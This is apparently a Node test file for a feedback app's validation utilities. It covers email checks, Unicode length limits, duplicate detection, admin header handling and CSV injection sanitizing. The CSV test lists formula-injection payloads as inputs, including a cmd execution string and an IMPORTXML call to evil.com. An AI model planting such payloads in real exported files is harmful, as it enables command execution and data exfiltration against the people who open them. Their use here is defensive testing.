import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  EMAIL_REGEX,
  countCharacters,
  validateIdeaSubmission,
} from '../src/app/utils/validation.ts';
import { sanitizeCsvCell } from '../src/app/utils/csv.ts';
import { detectDuplicates } from '../src/app/utils/duplicates.ts';
import { buildAuthHeaders } from '../src/app/utils/headers.ts';
import {
  reconcilePendingSubmissions,
  reconcileNotifications,
} from '../src/app/utils/reconciliation.ts';

describe('IdeaHub Feedback System Core Validations (Production Modules)', () => {

  describe('Email Regex Validation (EMAIL_REGEX)', () => {
    it('should accept valid standard email addresses', () => {
      assert.ok(EMAIL_REGEX.test('customer@example.com'));
      assert.ok(EMAIL_REGEX.test('alex.smith+feedback@sub.domain.co.uk'));
      assert.ok(EMAIL_REGEX.test('sarah.c@external.com'));
    });

    it('should reject email addresses with single-letter TLDs', () => {
      assert.equal(EMAIL_REGEX.test('user@example.c'), false);
      assert.equal(EMAIL_REGEX.test('test@domain.x'), false);
    });

    it('should reject invalid or malformed email addresses', () => {
      assert.equal(EMAIL_REGEX.test('not-an-email'), false);
      assert.equal(EMAIL_REGEX.test('user@domain'), false);
      assert.equal(EMAIL_REGEX.test('@example.com'), false);
      assert.equal(EMAIL_REGEX.test('user space@domain.com'), false);
    });
  });

  describe('Unicode & Multibyte Length Validation (countCharacters & validateIdeaSubmission)', () => {
    it('should accurately count Unicode code points for CJK and emojis', () => {
      const cjk = '这是一个关于产品功能增强的建议'; // 15 Chinese characters
      assert.equal(countCharacters(cjk), 15);
      assert.equal(countCharacters('Dark Mode 🌙✨'), 12);
    });

    it('should accept 41-character CJK title which exceeds 120 bytes in UTF-8', () => {
      // 41 Chinese characters = 123 bytes in UTF-8
      const cjkTitle41 = '中'.repeat(41);
      assert.equal(countCharacters(cjkTitle41), 41);
      assert.equal(Buffer.byteLength(cjkTitle41, 'utf8'), 123);
      const res = validateIdeaSubmission(
        cjkTitle41,
        'Valid description for feedback submission',
        'tester@example.com'
      );
      assert.equal(res.valid, true);
    });

    it('should reject titles exceeding 120 characters', () => {
      const longTitle = 'a'.repeat(121);
      const res = validateIdeaSubmission(longTitle, 'Valid description', 'tester@example.com');
      assert.equal(res.valid, false);
      assert.match(res.error, /cannot exceed 120 characters/);
    });

    it('should reject descriptions exceeding 2000 characters', () => {
      const longDesc = 'd'.repeat(2001);
      const res = validateIdeaSubmission('Valid Title', longDesc, 'tester@example.com');
      assert.equal(res.valid, false);
      assert.match(res.error, /cannot exceed 2000 characters/);
    });

    it('should reject short titles (< 3 characters) or short descriptions (< 5 characters)', () => {
      assert.equal(validateIdeaSubmission('ab', 'Valid description', 'tester@example.com').valid, false);
      assert.equal(validateIdeaSubmission('Valid Title', 'test', 'tester@example.com').valid, false);
    });
  });

  describe('CSV Injection Neutralization (CWE-1236 sanitizeCsvCell)', () => {
    it('should prefix dangerous formula triggers with an apostrophe and quote cells', () => {
      assert.equal(sanitizeCsvCell('=SUM(A1:A10)'), '"\'=SUM(A1:A10)"');
      assert.equal(sanitizeCsvCell('+cmd|/c calc'), '"\'+cmd|/c calc"');
      assert.equal(sanitizeCsvCell('-2+3*4'), '"\'-2+3*4"');
      assert.equal(sanitizeCsvCell('@IMPORTXML("http://evil.com")'), '"\'@IMPORTXML(""http://evil.com"")"');
      assert.equal(sanitizeCsvCell('\tTabInjected'), '"\'\tTabInjected"');
    });

    it('should not alter normal text cells except for standard CSV escaping', () => {
      assert.equal(sanitizeCsvCell('Add Dark Mode'), '"Add Dark Mode"');
      assert.equal(sanitizeCsvCell('Idea with "quotes"'), '"Idea with ""quotes"""');
      assert.equal(sanitizeCsvCell(''), '""');
    });
  });

  describe('Duplicate Detection Algorithm (detectDuplicates)', () => {
    const mockIdeas = [
      { id: '1', title: 'Add Dark Mode support' },
      { id: '2', title: 'Improve Search Function' },
      { id: '3', title: 'Bug in Checkout Process' },
    ];

    it('should detect potential duplicates when keywords match case-insensitively', () => {
      const matches = detectDuplicates('dark mode theme', mockIdeas);
      assert.equal(matches.length, 1);
      assert.equal(matches[0].id, '1');
    });

    it('should return empty list when no meaningful words match or query is too short', () => {
      assert.deepEqual(detectDuplicates('ok', mockIdeas), []);
      assert.deepEqual(detectDuplicates('Completely unrelated feature', mockIdeas), []);
    });
  });

  describe('Admin Credential Header Protection (CWE-798 buildAuthHeaders)', () => {
    it('should never send an X-Admin-Key header when adminApiKey is empty or unset', () => {
      const headers = buildAuthHeaders('admin', '', 'customer@example.com');
      assert.equal(headers['X-Admin-Key'], undefined);
      assert.equal(Object.keys(headers).includes('X-Admin-Key'), false);
    });

    it('should send X-Admin-Key only when role is team/admin AND key is explicitly configured', () => {
      const headers = buildAuthHeaders('admin', 'custom-secret-key-123', 'customer@example.com');
      assert.equal(headers['X-Admin-Key'], 'custom-secret-key-123');
      assert.equal(headers['X-User-Role'], 'admin');
    });

    it('should never send X-User-Role or X-Admin-Key for customer role even if key exists', () => {
      const headers = buildAuthHeaders('customer', 'custom-secret-key-123', 'customer@example.com');
      assert.equal(headers['X-User-Role'], undefined);
      assert.equal(headers['X-Admin-Key'], undefined);
      assert.equal(headers['X-Voter-Key'], 'customer@example.com');
    });
  });

  describe('Submission Idempotency Reconciler (reconcilePendingSubmissions)', () => {
    it('should reconcile pending submissions only by matching exact ID', () => {
      const pendingMap = new Map([
        ['temp-uuid-1', { tempId: 'temp-uuid-1', title: 'Duplicate title' }],
        ['temp-uuid-2', { tempId: 'temp-uuid-2', title: 'Duplicate title' }]
      ]);

      const backendItems = [
        { id: 'temp-uuid-1', title: 'Duplicate title' }
      ];

      reconcilePendingSubmissions(backendItems, pendingMap);

      assert.equal(pendingMap.has('temp-uuid-1'), false);
      assert.equal(pendingMap.has('temp-uuid-2'), true);
    });
  });

  describe('Notification Reconciliation & Read State Persistence (reconcileNotifications)', () => {
    it('should preserve read state from readNotificationIds and local records', () => {
      const serverNotifs = [
        {
          id: 'srv-1',
          ideaId: 'idea-101',
          message: 'Status updated to In Progress',
          status: 'in-progress',
          createdAt: '2026-11-17T00:00:00Z'
        },
        {
          id: 'srv-2',
          ideaId: 'idea-102',
          message: 'Team replied to your feedback',
          status: 'planned',
          createdAt: '2026-11-17T01:00:00Z'
        }
      ];

      const localNotifs = [
        {
          id: 'srv-1',
          ideaId: 'idea-101',
          message: 'Status updated to In Progress',
          status: 'in-progress',
          createdAt: '2026-11-17T00:00:00Z',
          read: true
        }
      ];

      const readSet = new Set(['srv-2']);

      const reconciled = reconcileNotifications(serverNotifs, localNotifs, readSet);

      assert.equal(reconciled.length, 2);
      // Both should be recognized as read
      const n1 = reconciled.find(n => n.id === 'srv-1');
      const n2 = reconciled.find(n => n.id === 'srv-2');
      assert.equal(n1.read, true);
      assert.equal(n2.read, true);
    });
  });

  describe('Storage Resilience & Error Recovery', () => {
    it('should gracefully handle storage exceptions without crashing', () => {
      const mockStorage = {
        getItem: () => { throw new Error('SecurityError: The operation is insecure.'); },
        setItem: () => { throw new Error('QuotaExceededError'); }
      };

      let loaded = '';
      try {
        loaded = mockStorage.getItem('key') || '';
      } catch {
        loaded = '';
      }
      assert.equal(loaded, '');

      let writeFailed = false;
      try {
        mockStorage.setItem('key', 'val');
      } catch {
        writeFailed = true;
      }
      assert.equal(writeFailed, true);
    });
  });

});
